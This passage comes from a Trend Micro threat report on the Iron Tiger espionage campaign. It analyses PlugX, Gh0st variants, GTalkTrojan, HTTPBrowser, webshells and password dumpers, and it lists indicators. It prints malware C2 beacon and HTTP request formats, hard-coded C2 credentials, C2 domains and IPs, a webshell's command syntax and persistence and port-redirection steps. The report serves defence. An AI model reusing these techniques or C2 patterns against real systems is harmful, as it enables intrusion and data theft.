folder.\n\nSample PlugX attack scenario\n\nThe actors used the method above to infect computers aided by legitimate binaries from Microsoft or antivirus\n\ncompanies like Symantec and F-Secure. We have seen them use a Microsoft-signed binary, Form.exe. This was\n\ndropped, along with two other files, FormDll.dll (SHA-1: 4df17c9e64f7277538141e384d4a372c60787f1a)\n\nand Form.hlp (SHA-1: d3fb95d0eeccd99c475c6b985a6c911bed69f50d). FormDll.dll contained all of the\n\nmalicious code while _Form.hlp_ had the main malware binary and configuration. When the legitimate\n\n_Form.exe is launched, PlugX:_\n\n- Copies three components to C:\\Windows\\System32\n\n- Sets the files’ attributes to “hidden” and “system”\n\n- Sets the files’ time stamps to “2008/04/14”\n\n- Creates the service, “Microsoft .Net Framework NGEN 4.0”\n\n- Starts a zombie process called “svchost.exe” and injects code\n\n- Removes itself from infected systems\n\n\n-----\n\nPlugX infection as seen in the Windows registry\n\nPlugX files hidden in system32\n\n_PlugX SController 3.0_\n\nSController 3.0 is the internal name of some variants of the PlugX server-side binary. Its GUI, meanwhile, is\n\ncalled “PureICE.” PureICE’s Users panel provides a lot of information about infected machines, including:\n\n\n\n- Computer name\n\n- Local area network (LAN) IP\n\n- Wireless LAN (WLAN) IP\n\n- Location\n\n- Protocol\n\n- OS\n\n- Languages\n\nThe panel also groups infected machines based\n\non user definition though a default group name is\n\nalways present, “U.S.A.”\n\nDefault group name configured in PureICE\n\n\n\n- Memo\n\n- CPU\n\n- Memory\n\n- Screen resolution\n\n- Last online time\n\n- Version\n\n- CLSID\n\nTitle bar of a PlugX server-side binary\n\n\n-----\n\nThe second panel, Listeners, shows the server settings. It supports Transmission Control Protocol (TCP)\n\nand UDP. Note that TCP can accept HTTP or raw TCP transmissions at the same time. Clicking the infected\n\nmachines’ icons shows the Manager panel.\n\nPureICE’s Listener panel’s list of running infected machines\n\nPureICE’s Manager panel\n\nPureICE’s GUI had English spelling mistakes. Some features did not even use English, only Chinese.\n\nPureICE’s Manager panel had various functions, including:\n\n\n\n- Disk (file manager)\n\n- NetHood manager\n\n- File transfer\n\n\n\n- Processes (process manager)\n\n- Services manager\n\n- RegEdit (registry editor)\n\n\n-----\n\n- Netstat manager\n\n- Capture (screenshot manager)\n\n- Control (a kind of Remote Desktop Protocol\n\n[RDP] manager)\n\n- Shell (remote shell)\n\n- Telnet (not a Telnet manager but a DOS\n\nemulator)\n\n\n\n- PortMap (port-mapping, SOCKS4, or\n\nSOCKS5 manager)\n\n- SQL (connects to any database via Open\n\nDatabase Connectivity [ODBC])\n\n- Keylogger manager\n\n- Option (lock, log off, restart, or shut down\n\nwith message customization)\n\n\nPlugX has, to our knowledge, never been used by non-Chinese attackers, once again strengthening our\n\nassumption that Iron Tiger hails from China.\n\n_Gh0st variants_\n\nWe found several variants of the infamous Gh0st RAT used in Iron Tiger as well.\n\n_S.exe_\n\nOne of the Gh0st variants, _s.exe_ (SHA-1:\n\n_7b34f24703b5415bc46fdab3801ac79e3e82242a)_\n\nhas a lot of obfuscation functions. While it is\n\nheavily encrypted, in memory, it is easier to see\n\nthe infamous string, “Game Over Good Luck By\n\nWind,” appear.\n\nUnobfuscated strings in the Gh0st variant\n\n_S.exe_ was modified to evade antivirus detection. found in memory\n\nSome of its functions were also deactivated. It\n\naccesses the following C&C servers:\n\n_•_ _gameofthrones.ddns.net_\n\n_•_ _user.qzone.qq.com/1479457083_\n\n_•_ _ys168.com_\n\n_Gameofthrones.ddns.net_ has been hosted in various countries since February 2015, including the US,\n\nVietnam, and South Korea. Interestingly, one of its domains always points to the IP address, _chrome._\n\n_servehttp.com. We have yet to gather samples accessing the said C&C server though._\n\n_Ys168.com is a dynamic DNS in the form, <username>.ys168.com. Ys168.com without the subdomain as a_\n\nC&C server could have been just a mistake on the attackers’ part. This did not have any effect, however, as\n\n_s.exe could still access other C&C servers._\n\n\n-----\n\n_User.qzone.qq.com/1479457083 was a static link that s.exe used to directly get a C&C server’s IP address_\n\nfrom the Web page’s title. This page’s account has been suspended though.\n\nRing RAT\n\nRing RAT is the internal name of another\n\nIron Tiger-related Gh0st variant (SHA-1:\n\n_d72ef43059ad0d5b4fc1e218e5257439ac006308)_\n\ncompiled just this March. Two unique class\n\n\nnames in Ring RAT’s binary—CGh0stDoc and\n\n_CGh0stView—made it easy to see that it is a Gh0st_\n\nRAT derivative.\n\nRing RAT’s controller\n\nRing RAT’s controller had several capabilities, including:\n\n\nRing RAT version 5.0.0.0\n\n\n\n- File browser\n\n- Keylogger\n\n- Remote shell provider\n\n\n\n- System manager\n\n- Screen capture\n\n- Remarks (notes)\n\n\n-----\n\nIts builder, which allows attackers to easily create binaries to infect target systems, had several interesting\n\nimprovements from Gh0st RAT, including:\n\n- The “Active From” field allows attackers to configure specific times to activate malware. This is very\n\nuseful when they only want to send out data at certain hours that are less visible to victims monitoring\n\nnetwork log files.\n\n- The “File Type” option allows attackers to only collect files with configured extensions (.DOC, .TXT,\n\n.PPT).\n\n- “Add D-Signature” allows attackers to add digital signatures to binaries so these would be harder to\n\ndetect.\n\n- “Auto Fection U Disk” allows malware to automatically infect connected USB drives.\n\nRing RAT’s Build Server features\n\nThe additional features revealed that Ring RAT was built for espionage purposes.\n\n\n#### Ring RAT is not available in underground forums or any publicly accessible site. This modified Gh0st RAT could have been created for Iron Tiger’s or a closed community’s exclusive use.\n\n\n-----\n\nNBDDOS\n\nIron Tiger uses another Gh0st RAT variant, NBDDOS. A file named _“ver.exe”_ (SHA-1:\n\n_8c8f12ae866c38931e19d67fadc19bd18aaf0865), which was compiled on 26 December 2014, drops a DLL_\n\n(SHA-1: _5b638171811412b570ed500803ceca5ed85580ff), which was compiled 1 minute before_ _ver.exe_\n\nwas.\n\nThe DLL was dropped into %TEMP% then moved to %system%. Careful examination and comparison with\n\nGh0st’s code revealed that it was another derivative of the latter. NBDDOS is installed as a service named\n\n“MediaCenter.” This can’t be used as an IoC, however, since it can be easily configured using the builder.\n\nNBDDOS’s service name and description\n\nNBDDOS’s installation function can be modified using a multi-strcat function, probably in an attempt to\n\nevade string-based detection. Its C&C server address can be extracted from a Web page or is hard-coded\n\nin its binary.\n\nImproved NBDDOS installation function\n\n\n-----\n\nTwo C&C server types supported by NBDDOS\n\nNBDDOS was configured to retrieve C&C server addresses from a single Web page—phpxss.lofter.com.\n\nLofter.com is a light blogging or social networking service. It also uses “phpxss” as account name.\n\nIf the Web page option is configured, the IP address and port number must be surrounded by a unique\n\nmagic string, _“$$$$$$$$$$$$.”_ Two magic strings accompany the C&C server string, which can help\n\nserve as an IoC for other security investigators. Compared with the original Gh0st RAT, NBDDOS uses a\n\ndifferent encryption function.\n\nWeb page containing NBDDOS’s C&C server information\n\n\n-----\n\nNBDDOS’s encryption function\n\nNBDDOS also uses a special string, _“Vip20141226,”_ where “20141226” can correspond to the binary’s\n\ncompilation date. We have no idea though what “Vip” represents. The only reference we found was inside\n\nthe controller, near the credentials.\n\nAn NBDDOS controller used in Iron Tiger (SHA-1: _396af3ae018a9e251a832cce8aae1bcaa11cdc05)_\n\ncompiled on 8 December 2014 was named “hello.exe.”\n\nNBDDOS controller’s GUI\n\n\n-----\n\nMost of the original Gh0st RAT’s functions have\n\nbeen removed from NBDDOS, except for the\n\nremote control feature. Its builder supports the\n\nC&C server types, namely:\n\n- C&C information extracted from a Web page\n\nor file\n\n- Use of DNS resolution\n\n- Use of direct IP addresses\n\nTwo packers—UPX and FSG—are available though\n\nusers can also generate unpacked malware.\n\nMalware service names can be easily changed on\n\ninfected systems via the same interface.\n\nNBDDOS can easily be downloaded from Chinese\n\nunderground forums. NBDDOS builder\n\nA Chinese underground forum offering NBDDOS’s source code\n\n_GTalkTrojan_\n\nGTalkTrojan (SHA-1: _50d2fef4e680072441084053773350d9ba60cac6), which was compiled on 15_\n\nOctober 2012, has very few functions, including:\n\n- Provides a remote shell\n\n- Has a “getfile” feature for data exfiltration (Note that it can only send files from a victim’s computer to\n\na C&C server.)\n\n- Has a “settime” feature to set when infected systems should access C&C servers (default: 1 second)\n\n\n-----\n\n“Getfile” and “settime” functions of GTalkTrojan\n\nTo remain persistent, GTalkTrojan adds a RunOnce registry key, HKEY_CURRENT_USER\\SOFTWARE\\\n\n_Microsoft\\Windows\\CurrentVersion\\RunOnce\\._ It then copies itself into _c:\\windows\\svchost.exe,_\n\ncreates a “cmd” command pipe, and accesses a C&C server—update.gtalklite.com—via port 8080.\n\nGTalk Trojan adds the “vnet” registry key to remain persistent\n\n\n-----\n\n“Cmd” that GTalkTrojan creates\n\nC&C server reference in GTalkTrojan\n\nWhen a connection is established, GTalkTrojan sends the following information to a C&C server:\n```\n Computer=<COMPUTER NAME>[USERNAME]&lanip=<LAN IP ADDRESS>&uid=<UID>&os=\n <OPERATING SYSTEM> followed by command output\n\n```\nNetwork capture showing the data GTalkTrojan sends to a C&C server\n\n\n-----\n\nShould a C&C server require authentication, the following credentials are hard-coded into the binary:\n```\n Username: idmservice\n Password: D13idmAdm\n\n```\nGTalkTrojan uses the User-Agent, “HttpDump/1.0,” and sends out an MD5 hash as UID for SysDrive\nSerialNumber. It used the gtalklite.com domain in its compilation registration.\n\n```\nRegistrant Contact:\n zhong meng [REDACTED]\n sheng li [REDACTED]\n [REDACTED]j @ 126 . com\n tel: +86.[REDACTED]97837\n fax: +86.[REDACTED]97837\n he bei sheng he jian sha wa xiang xi liu wa cun\n CN\n\n```\n\nGTalkTrojan’s registration information\n\nWe found two other domains registered with the same information though they were not used in any\n\ntargeted attack operation that we know of.\n\n_HTTPBrowser_\n\nHTTPBrowser infects systems like PlugX does—via DLL side-loading. One version (SHA-1:\n\n_75f098d6b3f217aba4c068b12896c332216fc6b3) used in Iron Tiger employed a legitimate Kaspersky_\n\nbinary named “setup.exe” to infect systems with a malicious DLL. When launched, setup.exe:\n\n- Loads msi.dll via the DLL Hijacking technique\n\n- Unencrypts and runs msi.dll in memory\n\n- Copies itself into %ALLUSER%\\Application Data\\kav\\\n\n- Creates the Run registry key, HKLM\\Software\\Microsoft\\Current Version\\Run, to remain persistent\n\n- Creates the suspended process, msiexec.exe [CnC IP] [CnC Port] 1\n\n- Creates and runs a remote thread in the suspended process\n\n- Unpacks msi.dll.url\n\n- Replaces the original msiexec.exe image in memory with a malicious code\n\n- Executes the malicious code\n\n- Accesses a C&C server and waits for commands\n\n\n-----\n\nHTTPBrowser uses a specific technique to bypass User Access Control (UAC)[9].\n\nHTTPBrowser’s C&C server IP address and port information\n\nHTTPBrowser accesses a C&C server with the IP address, 103.24.1.54, via port 443. This was hosted in\n\nHong Kong at the time this paper was written. It creates a unique GUID that is stored in _config.ini_ on\n\ninfected systems. It then accesses a C&C server using the following HTTP GET request:\n```\n GET /loop?c=[computer]->[user]&l=[ip]&o=[os version]&u=[client id]&r=[inject\n mode]&t=[time stamp]\n Host: REDACTED\n Connection: Keep-Alive\n User-Agent: HttpBrowser/1.0\n\n```\nHTTPBrowser has remote shell-creation, uploading and/or downloading, and file-listing functions, which\n\nmake it a lightweight RAT that capable of executing more malicious commands or even exfiltrating data.\n\nTo the best of our knowledge, it is not available in underground forums or other publicly accessible sites. It\n\ncould have been created for the exclusive use in targeted attacks.\n\n\n#### Old unpatched servers that can be found online are easy prey to any attacker.\n\n\n_File certificate abusers_\n\nIron Tiger uses three tools signed with the certificates on the next page.\n\n\n-----\n\nIron Tiger uses this certificate signed on 22\n\nNovember 2012\n\n\nCertificate’s validity information\n\n\nThe certificate with serial number, 23 92 b8 b2 e1 d5 e9 27 c7 26 37 9b 45 d2 21 ce, valid from 15 September\n\n2012 to 15 November 2014, was issued by Korea-based company, SoftCamp. It was signed on 22 November\n\n2012 and has been used for the Netcat (nc) binary, HTran’s packed version, and a GSecDump binary.\n\nIt is not clear why the actors decided to sign files but not the malware at the same time and in the same way.\n\nWe have not seen any of the other file certificates they used. This could be because they did not need them\n\nand found that their tools and malware were enough to stealthily move inside target networks. Adding\n\nthe legitimate file certificate to their arsenal made it easier for the attackers to laterally move throughout\n\nnetworks and collect user credentials without getting noticed. Signed binaries are not often monitored by\n\nsecurity solutions.\n\nMore Iron Tiger tools\n\n_AspxSpy2014_\n\nAspxSpy is a publicly available WebShell. The version that Iron Tiger uses—AspxSpy2014—has been\n\nslightly modified though to evade detection.\n\n\n-----\n\n|File name|SHA-1|Description|\n|---|---|---|\n|AspxSpy2014Final.aspx|c3f5d5d52890fe72bd2fc4c08aaf538da73016d7|AspxSpy2014—Main|\n|PluginDeflater.exe|7875ec1ffad546476defe5ad3e87930e7fa7ba95|AspxSpy2014—Plug-in|\n|SUEXPPlugin.dll|45ff712ae34512a9ac70060cec62a9b85f62804b|AspxSpy2014—Plug-in|\n|TestPlugin.dll|b9f67198ffa311aecb85e9914cdd96d99ecbdf3c|AspxSpy2014—Plug-in|\n|activedsimp.dll|b27277142f4b4f71a757630a730314daae9ecfeb|AspxSpy2014—Plug-in|\n\n\nMore information on AspxSpy2014\n\n_PluginDeflater.exe is a tool used to compress AspxSpy’s plug-in DLLs. SUEXPPlugin.dll, meanwhile, is_\n\na local exploit plug-in for an old Serv-U FTP Server vulnerability. Finally, _activedsimp.dll_ is an Active\n\nDirectory service AspxSpy plug-in.\n\n_Mimikatz, ZhuMimikatz, and Invoke-Mimikatz_\n\nWe found several variants of the Mimikatz password dumper. While some were common versions\n\n(SHA-1: _3d3db9d8da0eba33444c73b6f85a4fd98a685055), others were not like ZhuMimikatz (SHA-_\n\n1: _4883376735f981386e473318482fadfe90edc670) and two Mimikatz PowerShell versions (SHA-1:_\n\n_14a4b7cd0215a3d512f97d6ec4072a784f123527_ and _ab68576e3cf6bf8020cf15a83390ebf9d545389b)._\n\nThese allowed Mimikatz to completely work in memory without leaving traces on the file system.\n\n_GSecDump_\n\nGSecDump is a free publicly available password dumper. It has been used for years by various threat actors\n\nand legitimate security auditors alike. Nearly all threat actors slightly modified the GSecDump binary to\n\nevade antivirus detection. All versions found are, in fact, detected on VirusTotal.\n\n_QuarksPwDump_\n\nPassword dumper, QuarksPwDump or hashdump.exe (SHA-1: 3c6becafa9594601db64dc32c2c0384425a8fb5c,\n\ndetected by Trend Micro as HKTL_PWDump), along with its source code, are also publicly available for\n\nfree on https://github.com/quarkslab/quarkspwdump. The actors, however, compiled their own version\n\nin June 2012, a month after the release of the original code. This showed that they closely monitored such\n\nsecurity tool updates.\n\n\n-----\n\n_GetPassword_x64_\n\nGetPassword_x64 (SHA-1:\n\n_71c11988a7a14e2257a91bcc5efa85520540aa5c,_\n\ndetected by Trend Micro as HKTL_PWDump) is a\n\npassword dumper specifically for 64-bit systems.\n\nIt is also publicly available. It has the debug string,\n\n_“C:\\Users\\K8team\\Desktop\\GetPassword\\_\n\n_Debug x64\\GetPassword.pdb,” in its binary that_\n\npoints to its developer, K8Team.\n\n_ReadPWD86_\n\n\nSample output of GetPassword_x64.exe\n\n\nReadPWD86 is another publicly available password dumper for x86 systems (SHA-1:\n\n_65b77d8b1ffd63a343c28e978487bc38b9792c6f, detected by Trend Micro as HKTL_PWDump)._\n\n_EFH3/1F_\n\nEFH3/1F is a command-line tool that encodes\n\nfiles. It has a pretty straightforward purpose.\n\nEFH3/1F’s output\n\n_NBTScan_\n\nNBTScan is a free publicly available tool that scans for open NETBIOS name servers on a local or remote\n\nTCP/IP network. Its functionality is based on that of standard Windows tool, nbtstat, though it operates on\n\nseveral addresses instead of just one.\n\n\n-----\n\nNBTScan’s options\n\n_Netcat_\n\nNetcat or nc.exe is a popular tool among network administrators and security auditors. It is often referred\n\nto as the “Swiss Army knife” of network-related tools. It allows users to read and write data across TCP\n\nor UDP network connections. While it is a very simple tool, it can do a lot of things, including opening a\n\nport and listening for connections, executing remote shells, and others. The nc.exe binary is signed with a\n\nSoftCamp file certificate.\n\n_Nc.exe’s options_\n\n\n-----\n\n_HTran_\n\nHTran is very popular among Chinese threat actors. It is a network communication bouncer that allows\n\nattackers to use compromised machines as pivot to access other unreachable systems, for one. We found a\n\npacked and slightly modified (SHA-1: 9484bb1b1c0e39355a66b20fc361846ce1f063e0,detected by Trend\n\nMicro as HKTL_HTRan) and an unpacked version (SHA-1: 0ad2796b1312af4db975a3978ede19e939e42846,\n\nalso HKTL_HTRan) of this tool used in attacks. Both were named “websys.exe.” The packed HTran version\n\nwas also signed with a SoftCamp file certificate.\n\nHTran command-line tool\n\n_Unknown redirection toolkit_\n\nThough we could not identify this toolkit’s name, we found that it comprised netcat and two files—drivers.\n\n_exe_ (SHA-1: _add6f880705b4aaf4b22b60dd67ca9034694550d,_ detected by Trend Micro as HKTL_\n\nPORTCON) and _ChangePort.exe_ (SHA-1: _a346588c70751815bbb4c0922ea2c5e1ab9953db,_ also HKTL_\n\nPORTCON). It is very rarely seen in targeted attack campaigns.\n\nAttackers who want to access RDP 3389 via port 80 on an IIS server configured to only leave port 80 open\n\ncan use this toolkit, among others. We saw attackers:\n\n- Execute drivers.exe on the IIS server, which installs a Network Driver Interface Specification (NDIS)\n\ndriver\n\n- Run ChangePort.exe to map any port to port 3389 on the IIS server\n\n- Execute nc.exe and access the target server via port 80\n\n- When a connection has been established, send the special string, “Send chkroot2007,” and disconnect\n\n- An RDP client can now be connected to a target system’s port 80 while all network traffic is redirected\n\nto port 3389\n\nBecause the attackers identified themselves by sending the special string, only their traffic is redirected.\n\nEveryone else’s will be unaffected and stay on port 80.\n\n\n-----\n\nZval.jsp\n\n_Zval.jsp is not a standalone WebShell, it needs a client to run on compromised servers. All commands are passed_\n\nwith the parameter, /[REDACTED].jsp?[Password]=[Command]&z1=[Argument]&z2=[Argument]. The\n\nfollowing commands can be used:\n\n\n\n- A List drives\n\n- B List files in target directory\n\n- C Read file (ASCII mode)\n\n- D Write file (ASCII mode)\n\n- E Delete file or directory\n\n- F Download file (Binary mode)\n\n- G Upload file (Hex to Binary mode)\n\n- H Copy file or directory\n\n- I Rename file\n\nThis WebShell works with China Chopper.\n\n_HTTP/SOCKS Proxy_\n\n\n\n- J Create directory\n\n- K Set last modified time for file\n\n- L Download file from remote URL\n\n- M Execute shell command\n\n- N Get database information\n\n- O List tables for specific database\n\n- P List columns for specific table\n\n- Q Execute SQL command\n\n\nWe also found a tool called “so.exe” (SHA-1: 3ea58b2ff30ee1053a4053c681042516cb57038e, detected by\n\nTrend Micro as HKTL_Proxy). It is a very basic HTTP/SOCKS proxy, which is a slightly modified version\n\nof the publicly available SOCKS v4 && v5 && Http Proxy V2.0 by LZX.\n\n_Other tools_\n\nIn addition to the above-mentioned tools, the actors also use legitimate tools, including:\n\n_•_ _Local.exe from Microsoft’s Resource Kit, which enumerates the members of local groups on remote_\n\nservers or domains\n\n- Microsft’s PsGetSid.exe, which allows users to translate SIDs into display names and vice versa\n\n- Joeware.net’s GetUserinfo\n\nWe also found old exploits (CVE-2008-1436) for IIS 6 named _“helloa.exe”_ (SHA-1:\n\n_126a5972a0f6b0a5b0a2b52d7d848e8a9824f562,_ detected by Trend Micro as HKTL_IISExploit) and\n\n_“6.exe” (SHA-1: 856c3252fbc3d0e17d7d65cddff1ebbbab48496d, also HKTL_IISExploit)._\n\n\n-----\n\n###### Infrastructure\n\nIron Tiger’s C&C infrastructure included several compromised servers and the extensive use of BAIGE\n\nVPN’s services.\n\nCompromised C&C servers\n\nIron Tiger successfully compromised an Asian academic institution’s server to act as C&C server and stolen\n\ndata drop zone for dnstunclient. It was also accessed by a PlugX variant through a subdomain of shangxian.\n\n_info. We decided not to disclose this subdomain though since it can reveal the academic institution’s name._\n\nThis server was poorly configured. It was also used by warez distributors, in addition to the actors. The\n\nwarez distributors used it to store videos for virtually anyone on the Internet. FTP access to it did not\n\nrequire authentication. As such, anyone can use its various folders. One user even created a folder with a\n\nfunny name just to show how poorly secured the server was.\n\nData collected from C&C servers\n\nWe were able to gather a lot of information from Iron Tiger’s main C&C server—the academic institution’s\n\ncompromised server.\n\n_Network connections made to C&C servers_\n\nSeveral network connections made via RDP were seen. This is not surprising, as the protocol is used to\n\naccess remote computers from different geographical locations. The actors accessed the C&C server using\n\nvarious IP addresses.\n\nIP address Computer name Location\n\n114.88.206.132 YOUSISTE China\n\n211.62.158.22 YOUSISTE Korea\n\n180.150.226.27 YOUSISTE Korea\n\n67.198.244.74 YOUSISTE USA\n\n157.7.64.122 YOUSISTE Japan\n\n157.7.64.122 XM-ATT Japan\n\n125.140.30.31 YOUSISTE Korea\n\n203.232.186.35 YOUSISTE Korea\n\nIP addresses that the actors use to access the C&C server\n\n|IP address|Computer name|Location|\n|---|---|---|\n|114.88.206.132|YOUSISTE|China|\n|211.62.158.22|YOUSISTE|Korea|\n|180.150.226.27|YOUSISTE|Korea|\n|67.198.244.74|YOUSISTE|USA|\n|157.7.64.122|YOUSISTE|Japan|\n|157.7.64.122|XM-ATT|Japan|\n|125.140.30.31|YOUSISTE|Korea|\n|203.232.186.35|YOUSISTE|Korea|\n\n\n-----\n\nThe computer name, “YOUSISTE,” frequently accessed the server, though we did not find useful information\n\non it. Interestingly, two different computers used the same IP address to access the C&C server. An attacker\n\ncould have used two computers to access the server or several attackers could have used the same attack\n\ninfrastructure.\n\nWe believe the RDP connections were aided by VPN services and/or compromised computers, making the\n\nactors harder to track and find. A connection going to a Chinese IP address (116.233.12.114), which was\n\nused as a data-exfiltration channel, was also seen.\n\n_Attackers’ local account_\n\nA single user account named “xss” was created on the C&C server (compromised Windows Server® 2003)\n\non 14 September 2014. It used the password, “woshinidie,” which translates to “I am your father” in Pinyin.\n\nPinyin is the official phonetic system for transcribing Mandarin pronunciations of Chinese characters into\n\nthe Latin alphabet. This password could be a funny reference to “Star Wars.”\n\nThe letters, “xss,” also seen in the Blogspot page (xssok), were again seen in reference to the C&C server.\n\nThe xss user account was used in the last quarter of 2014. It has not been used since. Instead, the real\n\nadministrator account was used.\n\nAdditional email accounts\n\nApart from the account used in spear-phishing campaigns, we saw the actors use additional email accounts\n\nfor various purposes. They had several email accounts, mostly for testing purposes, with “phpxss” or\n\n“testxss” from providers like Gmail™, Hotmail, AOL, and Yahoo!®.\n\nThe actors could be reporting to a different email address per victim. They, for instance, sent a list of files\n\nfrom a compromised system to a specific email address, which indicated the progress made. It is not clear,\n\nhowever, if the receiver was a member of the group or a third party that provided expert services to let\n\nattackers know which files were worth stealing.\n\nExtensive use of BAIGE VPN’s services\n\nPhpxss extensively used BAIGE VPN’s servers, which were mostly located in China (a little more than 500\n\ndifferent IP addresses). Some servers were located in the US, Canada, Hong Kong, Russia, Taiwan, Japan,\n\nand South Korea.\n\n\n-----\n\nChina\n\nUnited States\n\nTaiwan\n\nHong Kong\n\nJapan\n\nKorea\n\nRussia\n\nCanada\n\nCountries where BAIGE VPN servers were located\n\n\n94.45%\n\n1.97%\n\n0.89%\n\n0.72%\n\n0.72%\n\n0.72%\n\n0.36%\n\n0.17%\n\n\nBAIGE VPN offers very affordable services. Its most expensive offering was a one-year subscription worth\n\n130 Yuan (around €19). Its Windows client is pretty straightforward.\n\nBAIGE VPN’s service prices\n\n\n-----\n\nBAIGE VPN’s client GUI\n\nWhile phpxss appears to use this service, it may not be the only one. To ensure anonymity, attackers\n\nnormally hid behind several layers or VPNs or proxies.\n\n\n#### BAIGE VPN does not accept customers outside China. It immediately filters out external connections via a registration page.\n\n\nDomain registration\n\nIron Tiger used several legitimate online services for its infrastructure but also employed registered\n\ndomains.\n\nShangxian.info\n\nOne of _shangxian.info’s_ subdomains was configured to point to the main C&C server’s IP address. The\n\ndomain was registered by phpxss.\n\nInterestingly, one user named “myershao” uses the exact same password as phpxss to create a local account\n\non a compromised machine. A familiar email address, [REDACTED]o @ live . cn, was also seen.\n\n\n-----\n\nPi.mai1.info\n\n_Pi.mai1.info was used in relation to two malware families at the same time—Gh0st and PlugX. These served_\n\nas file attachments in a spear-phishing campaign.\n\nIn one campaign, a .RAR file named _“documentation.rar”_ contained a dropper (SHA-1:\n\n_3bcd90785ff5883bc460a74eca3bf9033a542335) of a Gh0st variant named_ _“NWCWorkstationex.dll”_\n\n(SHA-1: _96d6a67227a6d650ab8c5465cb4b091217e75a5f)._ _NWCWorkstationex.dll_ could be an early\n\nversion of Ring RAT configured to steal .DOC, .TXT, and .PPT files.\n\nTarget file types hard-coded in the NWCWorkstationex.dll binary\n\nAnother archive seen contained a dropper (SHA-1: 11348a72a0864c6c455a535d5d7bde2997270266) of a\n\nPoison Ivy variant (SHA-1: _6bcd525bb425dbb7fbc79dd6a605fac8f925b0cb) named_ _“mspmsnsv.dll.”_ Its\n\nconfiguration leaked the nickname, “2shao,” which we were not able to tie to a real person’s identity or\n\nprofile.\n\n_Mai1.info’s registration information has changed several times. It showed references to supposed identities_\n\nin Russia or the US at the time it was being actively used by malware. It had matching elements tied to\n\n_[REDACTED]o @ live . cn and Guo Fei._\n\n```\nRegistrant Name: Guo Fei [REDACTED]\nRegistrant Organization:\nRegistrant Street1: He Nan Sheng Huo Jia Xian\nRegistrant Street2:\nRegistrant Street3:\nRegistrant City: XinXiang\nRegistrant State/Province: HeNan\nRegistrant Postal Code: 0373\nRegistrant Country: CN\nRegistrant Phone: +86.[REDACTED]39262\nRegistrant Email: [REDACTED]o @ live . cn\n\n```\n\n_Mai1.info’s registration information_\n\n\n-----\n\n## Mitigation: Combating cyber espionage and targeted attacks\n\nForeign spies in espionage films help their nations obtain competitive advantages over others by jumping\n\nseemingly impossible hoops and hurdles. These days, spying happens in cyberspace where threat actors\n\nare aided by either ready-made or customized tools and social engineering lures.\n\nWe saw cyberspies with digital roots in China target high-technology organizations from the US, but not\n\nbefore spending years extracting information from targets in Asia-Pacific, including their own country.\n\nIron Tiger, which could be part of a larger campaign where actors are assigned specific targets to monitor,\n\nparticularly trailed its sights on obtaining defense-related information. It is believed to have stolen up to\n\nterabytes of data, given that an organization lost 58GB alone.\n\nTargets face serious repercussions, given the sensitive nature of the data they keep. The data the actors\n\nstole, after all, translates to years of invaluable government and corporate research and development\n\n(R&D) dollars.\n\nFor nation-states like the US and China, cyber espionage may not come as a surprise. Several campaigns\n\nlike Pawn Storm and Arid Viper have already taken advantage of the weakest links across industries to gain\n\ncounterintelligence or perform industrial espionage on perceived foes.\n\nQuestions with regard to threat mitigation remain. Thwarting cyber attacks should not rely on off-the-shelf,\n\ntraditional anti-malware solutions alone. Sensitive data requires custom defense and multilayer protection\n\nthat can’t be easily rendered useless by spear-phishing campaigns and malware attacks. Organizations\n\nneed to gather threat intelligence to combat cyber espionage and protect against targeted attacks. They\n\nshould operate under the assumption that their network has already been compromised.\n\n\n-----\n\n##### References\n\n1. CrowdStrike. (2013). “CrowdStrike Global Threat Report: 2013 Year in Review.” Last accessed\n\non 14 September 2015, _http://www.crowdstrike.com/wp-content/uploads/cs_downloads/_\n\n_CrowdStrike_2013_Global_Threat_Intel_Report.pdf._\n\n2. Dell SecureWorks. (5 August 2015). Dell SecureWorks. “Threat Group-3390 Targets Organizations for\n\nCyber Espionage.” Last accessed on 14 September 2015, http://www.secureworks.com/cyber-threat\n_intelligence/threats/threat-group-3390-targets-organizations-for-cyberespionage/._\n\n3. Feike Hacquebord. (18 August 2015). TrendLabs Security Intelligence Blog. “Pawn Storm’s Domestic\n\nSpying Campaign Revealed; Ukraine and US Top Global Targets.” Last accessed on 9 September\n\n2015, _http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storms-domestic-spying-_\n\n_campaign-revealed-ukraine-and-us-top-global-targets/._\n\n4. China Vitae. (2003–2015). China Vitae. “Han Zheng 韩正.” Last accessed on 9 September 2015, http://\n\n_www.chinavitae.com/biography/Han_Zheng/summary._\n\n5. TrendLabs. (8 December 2014). Trend Micro Security News. “The Hack of Sony Pictures: What We\n\nKnow and What You Need to Know.” Last accessed on 9 September 2015, http://www.trendmicro.\n\n_com/vinfo/us/security/news/cyber-attacks/the-hack-of-sony-pictures-what-you-need-to-know._\n\n6. Keith Tyler. (16 November 2012). _Information on Security._ “China Chopper WebShell—The 4KB\n\nThat Owns Your Web Server.” Last accessed on 10 September 2015, _http://informationonsecurity._\n\n_blogspot.fr/2012/11/china-chopper-webshell.html._\n\n7. Ryan Angelo Certeza. (4 October 2012). _Threat Encyclopedia._ “Pulling the Plug on PlugX.” Last\n\naccessed on 11 September 2015, _http://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-_\n\n_attack/112/pulling-the-plug-on-plugx._\n\n8. Jaime Blasco. (13 September 2012). _The AlienVault Blogs: Taking On Today’s Threats._ “Tracking\n\nDown the Author of the PlugX RAT.” Last accessed on 11 September 2015, https://www.alienvault.\n\n_com/open-threat-exchange/blog/tracking-down-the-author-of-the-plugx-rat._\n\n9. Leo Davidson. (2009). <<pretentious/name>>. “Windows 7 UAC Whitelist: Proof-of-Concept Source\n\nCode.” Last accessed on 11 September 2015, http://www.pretentiousname.com/misc/W7E_Source/\n\n_Win7Elevate_Inject.cpp.html._\n\n\n-----\n\nCreated by:\n\nThe Global Technical Support and R&D Center of TREND MICRO\n\nTREND MICRO[TM]\n\nTrend Micro Incorporated, a global cloud security leader, creates a world safe for exchanging digital information with its Internet content security and threat\n\nmanagement solutions for businesses and consumers. A pioneer in server security with over 20 years experience, we deliver topranked client, server, and\n\ncloud-based security that fits our customers’ and partners’ needs; stops new threats faster; and protects data in physical, virtualized, and cloud environments.\n\nPowered by the Trend Micro™ Smart Protection Network™ infrastructure, our industry-leading cloud-computing security technology, products and services\n\nstop threats where they emerge, on the Internet, and are supported by 1,000+ threat intelligence experts around the globe. For additional information, visit\n\nwww.trendmicro.com.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
